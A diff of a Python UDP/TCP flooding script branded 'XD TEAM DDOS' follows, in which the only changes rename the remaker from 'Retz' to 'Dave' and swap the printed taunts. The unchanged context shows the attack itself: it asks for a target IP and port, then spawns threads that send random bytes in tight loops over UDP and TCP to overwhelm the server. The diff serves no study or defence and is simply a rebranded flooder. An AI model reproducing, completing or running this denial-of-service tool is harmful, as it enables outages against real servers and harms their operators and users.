@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 #Code by LeeOn123
-#remake by Retz
+#remake by Dave
 import random
 import socket
 import threading
 
 print("--> CREDITS : LEOON TCP UDP <--")
-print("--> REMAKE BY RetZ <--")
+print("--> REMAKE BY Dave <--")
 print("--> XD TEAM DDOS <--")
 print("#-- JOIN THIS IS COMUNITY --#")
 ip = str(input(" IP:"))
@@ -23,9 +23,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" MengEtek Server!!!")
+			print(i +" XD Dave NIH BOSS!!!")
 		except:
-			print("[!] MengEtek Server!!!")
+			print("[!] XD Dave NIH BOSS!!!")
 
 def run2():
 	data = random._urandom(160)
@@ -37,10 +37,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" MengEtek Server!!!")
+			print(i +" XD Dave NIH BOSS!!!")
 		except:
 			s.close()
-			print("[*] MengEtek Server")
+			print("[*] XD Dave NIH BOSS")
 
 for y in range(threads):
 	if choice == 'y':
